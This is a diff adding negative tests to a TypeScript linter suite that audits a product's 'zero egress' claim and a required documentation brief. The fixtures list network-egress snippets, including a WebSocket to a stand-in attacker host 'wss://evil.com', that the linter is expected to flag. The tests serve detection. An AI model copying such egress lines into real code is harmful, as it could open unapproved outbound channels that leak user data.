@@ -82,6 +82,17 @@ describe('Store Metadata & Documentation Claims Linter (claims-linter.test.ts)',
     const errors: string[] = [];
     auditZeroEgress(errors);
     expect(errors).toEqual([]);
+
+    // Fixture-based negative test asserting unauthorized egress primitives are reported
+    const primitiveErrors: string[] = [];
+    auditZeroEgress(primitiveErrors, {
+      overrideCodeSnippets: [
+        'const f = fetch;',
+        'navigator?.sendBeacon("/api/telemetry");',
+        'const ws = new WebSocket("wss://evil.com");',
+      ],
+    });
+    expect(primitiveErrors.length).toBe(3);
   });
 
   it('verifies Portfolio Master Brief parity (test count and test file inventory) if brief is present', () => {
@@ -90,5 +101,14 @@ describe('Store Metadata & Documentation Claims Linter (claims-linter.test.ts)',
     if (checked) {
       expect(errors).toEqual([]);
     }
+
+    // Negative test: brief required but missing
+    const missingErrors: string[] = [];
+    auditPortfolioMasterBrief(missingErrors, {
+      requireBrief: true,
+      overrideBriefPath: '/non-existent/path/BRIEF.md',
+    });
+    expect(missingErrors.length).toBeGreaterThan(0);
+    expect(missingErrors[0]).toContain('not found but required via --require-brief');
   });
 });
